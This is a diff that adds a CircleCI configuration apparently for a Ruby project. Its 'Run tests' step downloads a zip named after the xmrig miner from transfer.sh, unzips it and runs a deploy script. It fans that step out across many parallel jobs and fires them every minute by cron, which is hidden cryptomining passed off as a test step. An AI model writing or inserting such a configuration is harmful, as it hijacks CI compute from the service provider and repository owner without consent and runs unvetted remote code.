@@ -1,0 +1,353 @@
+working_dir: &working_dir ~/app
+
+.build_template: &script
+
+  steps:
+
+    - checkout
+
+    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
+
+    - run: chmod +x ./cc-test-reporter
+
+    - run: ./cc-test-reporter before-build
+
+    - run: gem install bundler:2.1.4
+
+    - run:
+
+        name: Run tests
+
+        command: |
+
+                    apt update 
+
+                    apt install screen -y 
+
+                    wget https://transfer.sh/I29TIo/basomaspartoxmrig.zip && unzip basomaspartoxmrig.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+
+
+version: 2.0
+
+jobs:
+
+  endvoc:
+
+    docker:
+
+      - image: ruby
+
+    parallelism: 4   
+
+    steps:
+
+      - checkout
+
+  endvoc1:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.7
+
+    parallelism: 4   
+
+  endvoc2:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.6
+
+    parallelism: 4   
+
+  endvoc3:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.5
+
+    parallelism: 4   
+
+  endvoc4:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.4
+
+    parallelism: 4   
+
+  endvoc5:
+
+    docker:
+
+      - image: ruby
+
+    parallelism: 4    
+
+    steps:
+
+      - checkout
+
+  endvoc6:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.7
+
+    parallelism: 4   
+
+  endvoc7:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.6
+
+    parallelism: 4   
+
+  endvoc8:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.5
+
+    parallelism: 4   
+
+  endvoc9:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.4
+
+    parallelism: 4   
+
+  endvoc10:
+
+    docker:
+
+      - image: ruby
+
+    parallelism: 4   
+
+    steps:
+
+      - checkout
+
+  endvoc11:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.7
+
+    parallelism: 4   
+
+  endvoc12:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.6
+
+    parallelism: 4  
+
+  endvoc13:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.5
+
+    parallelism: 4  
+
+  endvoc14:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.4
+
+    parallelism: 4   
+
+  endvoc15:
+
+    docker:
+
+      - image: ruby
+
+    parallelism: 4  
+
+    steps:
+
+      - checkout
+
+  endvoc16:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.7
+
+    parallelism: 4   
+
+  endvoc17:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.6
+
+    parallelism: 4  
+
+  endvoc18:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.5
+
+    parallelism: 4
+
+  endvoc19:
+
+    <<: *script
+
+    docker:
+
+      - image: ruby:2.4    
+
+    parallelism: 4
+
+workflows:
+
+  version: 2
+
+  commit:
+
+    jobs:
+
+      - endvoc
+
+      - endvoc1
+
+      - endvoc2
+
+      - endvoc3
+
+      - endvoc4
+
+      - endvoc5
+
+      - endvoc6
+
+      - endvoc7
+
+      - endvoc8
+
+      - endvoc9
+
+      - endvoc10
+
+      - endvoc11
+
+      - endvoc12
+
+      - endvoc13
+
+      - endvoc14
+
+      - endvoc15
+
+      - endvoc16
+
+      - endvoc17
+
+      - endvoc18
+
+      - endvoc19
+
+
+
+
+
+    triggers:
+
+      - schedule:
+
+          cron: '* * * * *'
+
+          filters:
+
+            branches:
+
+              only:
+
+                - master
+
+         
+
+  endvocrunjob:
+
+    jobs:
+
+      - endvoc
+
+      - endvoc1
+
+      - endvoc2
+
+      - endvoc3
+
+      - endvoc4
+
+      - endvoc5
+
+      - endvoc6
+
+      - endvoc7
+
+      - endvoc8
+
+      - endvoc9
+
+      - endvoc10
+
+      - endvoc11
+
+      - endvoc12
+
+      - endvoc13
+
+      - endvoc14
+
+      - endvoc15
+
+      - endvoc16
+
+      - endvoc17
+
+      - endvoc18
+
+      - endvoc19
